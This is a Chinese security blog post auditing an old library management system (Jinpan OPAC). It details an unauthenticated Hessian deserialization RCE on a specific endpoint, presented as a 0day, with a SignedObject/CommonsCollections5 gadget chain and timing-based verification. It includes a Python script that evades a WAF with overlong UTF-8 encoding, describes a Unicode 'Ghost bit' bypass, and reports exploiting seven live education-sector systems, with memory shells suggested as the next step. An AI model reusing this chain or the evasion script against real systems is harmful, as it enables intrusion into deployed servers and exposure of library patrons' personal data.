#  某盘图书管理系统审计(0dayRCE绕WAF)  
 渗透结束-非常安全   2026-10-20 02:55  
  
```
本文本人首发于https://cn.t00ls.com/articles-75626.html
```  
# 前言  
  
这套源码应该挺旧了，之前刚学代审的时候实在是挖不到新的0day了，就一直搁置，AI最近太强了，想起这个就来看看，源码里的漏洞还是挺多的，但实际很多已经是新版所以都修复了，AI审了一下，也算是柳暗花明又一村，出了个反序列化RCE，不过利用起来也是一波三折。PS：天天晚上都睡不着，就怕睡着了起来看到宝哥消息说交报告了，实在是卷不过宝哥了，企业SRC猛猛出洞，东北刀枪炮这一块（家里上千亩地。。。。），真是又怕兄弟苦，又怕兄弟开路虎。  
# 鉴权分析  
  
老jsp系统了，老规矩先看下鉴权，找拦截器、过滤器  
  
现在真的是偷懒了，先看下历史漏洞（网上有文章，所以才说我以前没挖到0day。。因为那会思路比较少，而且没AI。），先让AI初步分析一下  
  
发现只有过滤器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFibqho7iaq9LhNBGcpaolxlB9mDP7KRpmL0ic1hFdMC2KecDXheib6o9ISuZ2qmUo1Q4ZVhqpHkaoQdrTxRfueF5JpjkJreGDc2icJU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFicgvicY0yxPuvrBs06af6TEpWicD9l3bJXHG1KftyicRej0OKEepPAMFDCU6QibCsmibf9V5uHvZzH8D26vnjdZic5s1jCynw0XcAHKs/640?wx_fmt=png&from=appmsg "")  
  
可疑的shiroFilter和另一处的ShiroSsoFilter两个过滤器，看下shiro版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFibngWIutRvI3QBL0YbeUicaMRjYJ0QZDETdTm4A8lu7kdRcHibeDmqIM2medrFibdtvxx40loeQySxiaTLpJq2AA7hq68SIJnsoJUU/640?wx_fmt=png&from=appmsg "")  
  
很旧的版本，看了一下果然存在默认密钥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vF9Ciclf2JMbAZ3C4PDsK2XpwvM2ueIMqsgpWFNDDdwqcxmRweXL7wMI8X5hS0icK305rjYEKUI3jNyMHVPA6L9A95JsyWAWIgzZM/640?wx_fmt=png&from=appmsg "")  
  
但没啥用，实际环境很多系统都是新版了。先看下shiroFilter过滤器，没啥东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vFicTcA6SGt6vibnic2A2r4Jq3fO9lDHGsVwSGLjDO0TQViasIXnXib6ziafNIQVDGjRbBZfx6r15zkr9icBIXrbh5MicrPfU2UkIHSPuyo/640?wx_fmt=png&from=appmsg "")  
  
再看ShiroSsoFilter过滤器  
```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {    AttributePrincipal principal;    HttpServletRequest request = (HttpServletRequest)servletRequest;    HttpServletResponse response = (HttpServletResponse)servletResponse;    Object object = request.getSession().getAttribute(CONST_CAS_ASSERTION);    Boolean cacLogin = ParamUtils.getBooleanParameter((HttpServletRequest)request, (String)"cacLogin", (boolean)true);    if (CommonConstants.openSSO && object != null && !SecurityUtils.getSubject().isAuthenticated() && cacLogin.booleanValue() && (principal = (AttributePrincipal)request.getUserPrincipal()) != null) {        Map attributes = principal.getAttributes();        if (ObjectUtils.isNotEmpty((Object)attributes)) {            String sign = String.valueOf(attributes.get("sign"));            String userName = String.valueOf(attributes.get("username"));            if (userName != null && userName != "") {                userName = new String(Base64.decodeBase64((byte[])userName.getBytes()));            }            if (sign != null && userName != null && !sign.equals("null") && !userName.equals("null")) {                boolean rememberMe = Boolean.getBoolean(String.valueOf(attributes.get("rememberMe")));                String p = Base64.encodeBase64String((byte[])String.valueOf(object).getBytes());                String loginType = "barCode";                MyUsernamePasswordToken token = new MyUsernamePasswordToken(userName, p.toCharArray(), rememberMe, request.getLocalAddr(), sign, loginType);                SecurityUtils.getSubject().login((AuthenticationToken)token);            } else {                logger.error((Object)"get cas attributes error:username or sign is null");            }        } else {            logger.error((Object)"get cas attributes error:null");        }    }    try {        if (ProductManager.getInstance().getProducts().size() == 0) {            throw new LicenseException("\u7cfb\u7edf\u672a\u6ce8\u518c", "1");        }        IVersion pro = ProductManager.getInstance().getProductByUrl(request);        if (pro != null) {            License.checked((IVersion)pro);        }    }    catch (Exception e) {        LicenseException ex;        if (e instanceof LicenseException && (ex = (LicenseException)e) != null && Flash.current() != null) {            Flash.current().put("p_error", ex.id);            Flash.current().put("p_msg", ex.getMessage());        }        RequestDispatcher rd = request.getRequestDispatcher("/pages/license_error.jsp");        rd.forward((ServletRequest)request, (ServletResponse)response);        return;    }    filterChain.doFilter((ServletRequest)request, (ServletResponse)response);}
```  
  
filterChain.doFilter放行在最后，可以看到只有异常的时候才会return，回头看if条件代码块和try代码块  
  
if与条件很长一个个看  
  
CommonConstants.openSSO是个类常量，跟进一下CommonConstants类找openSSO变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vF8K5ETmL82McofYiclianeSCTXrHyia7n6CNxI83cA4HBU1J0dxO74qZzGVYMEDX3HYkUdicUm5U57CNGDZ5ZAJtRic0Xap3ckZBiakI/640?wx_fmt=png&from=appmsg "")  
  
静态代码块直接赋值flase了。。那if代码块不就没用了吗。。看不懂开发的脑回路，跳过if继续看try代码块  
  
一看就知道是判断系统是否授权了的，直接过掉。。那鉴权到底在哪？可能有子项目还有过滤器，再找了找找到了子项目里的CASFilter过滤器  
  
回到web.xml看一下  
```
<!-- CAS 认证过滤器 --><filter>  <filter-name>CASFilter</filter-name>  <filter-class>org.jasig.cas.client.authentication.CasExtendAuthenticationFilter</filter-class>  <init-param>    <param-name>casServerLoginUrl</param-name>    <param-value>http://x.x.x.x:8080/login</param-value>  </init-param>  <init-param>    <param-name>renew</param-name>    <param-value>false</param-value>  </init-param>  <init-param>    <param-name>gatewayStorageClass</param-name>    <param-value>cn.com.goldlib.libweb.cas.client.authentication.URLGatewayResolverImpl</param-value>  </init-param>  <init-param>    <param-name>gateway</param-name>    <param-value>true</param-value>  </init-param>  <init-param>    <param-name>serverName</param-name>    <param-value>http://x.x.x.x:99</param-value>  </init-param>  <init-param>    <param-name>exclusions</param-name>    <param-value>/api/opac/IGdlisnet.sapi</param-value>  </init-param></filter>
```  
  
发现只排除了/api/opac/IGdlisnet.sapi这个路径，好像也没啥过滤。。最后看shiro配置文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vF8dJunytDTjaniaYrzZrU525HbhkgbKOJJnf5RlL6Bf7pThwmO6rOPHEGKBPHMeL8iaeQMeZibysiarR0W4tWnhX8I8SAPjicFRiaOkw/640?wx_fmt=png&from=appmsg "")  
  
可以看到只拦截/admin/**，别的都放行。。太抽象了，说实话我很好奇新版现在是啥代码逻辑，可惜拿不到。说实话这旧版系统鉴权就是一坨没啥好看的。历史漏洞网上有文章我就不详细写了，因为我看了下都是常规的没什么特别的思路，直接进入正题。  
# Hessian反序列化 RCE（0day）  
  
AI找的链路  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFicOxoB40mo69Kv8mvyCm5cfzoRrke3LRujFeDQVhadS4ib2w3wJQSCssEsmeIvwqu1k3QVmrnaniajibXSwxd5NmTiav7exlmejJMU/640?wx_fmt=png&from=appmsg "")  
  
前面两个鉴权我们都分析过了没啥过滤，正巧sink点就是前面那个过滤器放行的/api/opac/IGdlisnet.sapi路径存在未授权反序列化漏洞，跟进一下OpacRemoteDispatcherServlet类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFic8UEecXTEsIPDnvhh86JicZFqbN1SdicAxF2dTc4luz62sfffhwATH1SL1NWUdPFSsAtibCbLDXLqV2zEtt0VHKg8SiayJtb4CY3E/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vF9eEwL7cuRLAFjTeJLXV6go41Pl27BAt4MOjZzevDPP6iaThYM8gLwENABq6oiaOaYeNywyfFRBT9tzicbq5hKm9riciacPEdsG3k7s/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vFicic7mJeWyUuQicRrI5qx53sBuWTMdywrwQW02W185tBPzrSruDBibWS8p0EjxgA0eicFIPBsQbibqvdblBfRLAVoFwG91eypVuGiahs/640?wx_fmt=png&from=appmsg "")  
  
跟进GdlisnetManager类发现方法都没有鉴权，所以理论上是未授权调用GdlisnetManager类里任何方法（大量读者要素信息泄露）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vF8qibRKW5xr900sG7N3ZzQsrNISlvfmjMobBR9ya4qZfW2tqoDePKaFdRIQ5gibKFExYTU7M1zws3c6Q9ib0WU9BhWdWiaIpKJlI0A/640?wx_fmt=png&from=appmsg "")  
  
未授权Hessian反序列化已经确认  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9FYZj5r9vFibLA4IBUJnelMicPZB0Ws8RkHcFuZMI7hJEVkLwibLIx65LMD1x2oXyDibG1CFjhicNcCUpx42BpjicMqx1rmmhYHS1yic3YzvGlaKts/640?wx_fmt=png&from=appmsg "")  
  
找下这个hessian反序列化的版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9FYZj5r9vF8hcq1cJJvyEKwyFDWXOdub6k0rTPticIQuRcnUwI4AAiaPKBP4NjRjL5YO9S5q9hiblYQGjD5T6jDr5TIWSZXaN2wc2k3r8hhZ5I/640?wx_fmt=png&from=appmsg "")  
  
然后找下链子，找到了CVE-2021-43297这个，java-chains打了半天没通，后来仔细想有可能不出网，执行命令延时验证成功，构造链子这块全自动AI跑的，我真是不想人工看，每次看链子累的不行。。学一下AI写的链子  
  
接下来请看AI表演  
## CVE-2021-43297 延时验证 PoC 链完整讲解  
  
**漏洞本质一句话**  
：Hessian 反序列化**没有类型限制**  
。Hessian2Input.readObject()  
 拿到 classdef 就实例化任意类并填字段，4.0.37 及以前的版本没有任何可用的默认黑名单（CVE-2021-43297 官方 4.0.38 才补上）。  
  
**触发点——method 名位置的 trick**  
：金盘 OPAC 的入口是 POST /api/opac/IGdlisnet.sapi  
，正常调用是 Hessian2 call：48 02 00 43  
（Hessian2 协议头 + method 长度 0x02 + 'C'  
 call tag）+ 方法名字符串 + 参数对象。**关键是把手里的恶意字节流放到 method 名字符串的位置**  
：  
- 服务端 readMethod()  
 期待读到字符串 tag，我们给一个 0x4d 'M'  
（map）tag  
  
- expect("string")  
 校验失败 → Hessian2Input 走 readObject()  
** 回退** → 直接按 map 反序列化任意对象图  
  
method 位置比参数位置宽松，外层解析没有强类型校验，整段 payload 就是内嵌的 Java 原生序列化字节流。  
  
**链——SignedObject 壳包 CC5（跨协议嵌套）**  
：外层是 Hessian 的 map（CaseInsensitiveMap  
），放一对 ToStringBean(SignedObject)  
 键值。map 反序列化完隐式调 toString()  
 自动带出链子：  
```
Map.toString()  → ToStringBean.toString()    → SignedObject.getObject()            # 反射，返回内嵌对象      → ObjectInputStream.readObject()    # ← 这里切到 JAVA 原生反序列化        → CC5: TiedMapEntry → LazyMap → ChainedTransformer          → InvokerTransformer("sleep", [N])            → TimeUnit.MILLISECONDS.sleep(N)   # 纯 JVM 阻塞，不出网
```  
  
两层反序列化嵌套：**外层 Hessian 负责触发，内层 Java OIS 负责执行**  
。SignedObject.content  
 是天然的字节容器（JDK 自带、非第三方库），把 CC5 的原始字节塞进去即可——这也是"换 JDK 内置壳"能绕明文黑名单的底层原因：外层只见 java.security.SignedObject  
 / java.text.*  
/javax.management.BadAttributeValueExpException  
 这些 JDK 原生类名。  
  
**延时验证（时间侧信道）**  
——不出网环境最干净的证明方式：  
1. sleep 值在链里是个 Long  
，payload 字节流中是 **8 字节大端**  
（00 00 00 00 00 00 1F 40  
 = 8000ms）  
  
1. Runtime patch：按固定偏移改写这 8 字节 → 注入任意等待时长  
  
1. 基线对照：正常 getUnitName()  
 响应 **0.1s**  
  
1. 判定：实测耗时 ≥ 注入值 − 1s 即链路真实执行（sleep 参数完全可控 = 任意反射/命令参数可控）  
  
远程实测 11 个入口逐目标：注入 3000ms → 3.5s、5000ms → 5.1s、7000ms → 7.1s、9000ms → 9.1s，延迟与注入值精确对应，误差全是网络往返。  
  
**加分建议**  
：先本地验证再上远程——本地 JDK8u291 跑 exec 链，异常消息 foo=java.lang.processimpl@32a1bec0  
（Runtime.exec 返回值 = 命令已执行），延时链本地阻塞 8104ms；远程只打延时侧信道。  
# WAF绕过1  
```
# -*- coding: utf-8 -*-"""绕硬 WAF 用 overlong —— 寻找合适字符（仅供学习参考）思路：对 payload 里所有可打印 ASCII 串（类名/包名/路径）逐字符做两字节      overlong 编码，编码后若不再残留黑名单子串就采用，并回写字符串长度      字段。黑名单是明文型匹配，readUTF 语义还原后照样进链 —— 设备不认识      overlong 就等于没匹配到。"""import reBLACK = [b"org.apache.commons", b"com.sun.org.apache", b"TemplatesImpl",         b"InvokerTransformer", b"java.lang.Class"]def ovl2(ch):    if 0x00 <= ch <= 0x7F:                       # ASCII → 两字节 overlong        return bytes([0xC0 | (ch >> 6), 0x80 | (ch & 0x3F)])    return bytes([ch])def find_edits(body):    edits = []                                   # (start, end, 新字节串)    for m in re.finditer(rb"[ -~]{3,}", body):   # 可打印 ASCII 串（类名/路径等）        s = m.group()        enc = b"".join(ovl2(c) for c in s)        if any(b in enc for b in BLACK):         # 编码后仍残留黑名单 → 换/跳过            continue        edits.append((m.start(), m.end(), s, enc))    return editsdef patch_body(body, edits):    out = bytearray(body)    for a, b, s, enc in reversed(edits):         # 倒序替换，保证偏移不失效        out[a:b] = enc    return bytes(out)def fix_lens(body, edits):    """回写所有被撑大的字符串长度字段（2 字节大端），使 Hessian/Java 层可读"""    out = bytearray(body)    for a, b, s, enc in reversed(edits):        newlen = len(s) * 2                      # 每字符变 2 字节        hdr = a - 2                              # 长度字段通常在字符串前 2 字节        if hdr >= 0 and out[hdr:hdr + 2] == len(s).to_bytes(2, "big"):            out[hdr:hdr + 2] = newlen.to_bytes(2, "big")    return bytes(out)
```  
  
**配套说明**  
（对应你写的"换 JDK 内置壳 + 同长替换"）：  
- **换 JDK 内置壳**  
：黑名单拦的是 commons-collections.map.*  
 类名与裸串 InvokerTransformer  
，即**明文型子串匹配**  
。所以外层不出现第三方库，用 JDK 自带的 java.security.SignedObject  
 包 CC5 原始字节（content 字节容器），黑名单根本看不见 CC 链；即便看见 SignedObject  
/ToStringBean  
/Transformer  
 这类裸串，设备也是放行的。  
  
- **同长替换**  
：Hessian classdef 里的 java.lang.Class  
（15 字节）替换成 A  
×15（也是 15 字节，同长）——classdef 解析只报 unknown-class warning 不影响后续字段解析，但明文黑名单就匹配不到了。  
  
- **overlong 只选 '.' 与 '/' 就够用**  
：类名/包名里的分隔符就这两个（org/apache/commons/...  
、com.sun.org.apache  
），0x2E → C0 AE  
、0x2F → C0 AF  
，把分隔符 overlong 掉黑名单整串即断；必要时再对所有字母全字符 overlong（需要先确认目标 Java 层读的是 MUTF-8 的 readUTF，且没有"最短编码"校验——绝大多数 JDK 8 实现不做校验）。  
  
都是不出网的，后续利用可以打内存🐎，我在这里就点到为止了。  
# WAF绕过2-梅开二度  
  
碰上了更硬的。。。上一份payload在这里不停地403，短时间内多次403就会直接拉黑一会IP。。折腾了好久。。这里用到今年BlackHat出现的一个技术:Ghost bit，原理是：攻击者将攻击 Payload（如 ../）中的关键 ASCII 字符，替换为低8位与之相同的“无害”Unicode 字符，因为Java中(byte)ch、ch & 0xFF、OutputStream.write(int)等操作会静默丢弃16位char的高8位。在多次尝试后，发现成功绕过了，是的，302了，这个需要统一认证，人直接裂开，白绕了。这里其实应该先用一个确认方式就是：别的空POST那个漏洞接口访问直接是500，只有他是302。。好家伙，小丑了。绕过方式就是写脚本找可用替换的字符。  
# 总结  
  
最后也是拿下7个RCE，绕了2个WAF，这是套EDU系统，懒得写报告直接给朋友交了，也是成功从脚本小子进化为AI小子了，后续会打算尝试学习审计一些大型开源组件和分享一些企业SRC挖掘的经验（不过目前这方面我是纯AI小子，没啥可说的。），实在是太懒了现在，部分内容为AI编写，如有错误请指出，望各位多多担待。  
  
  
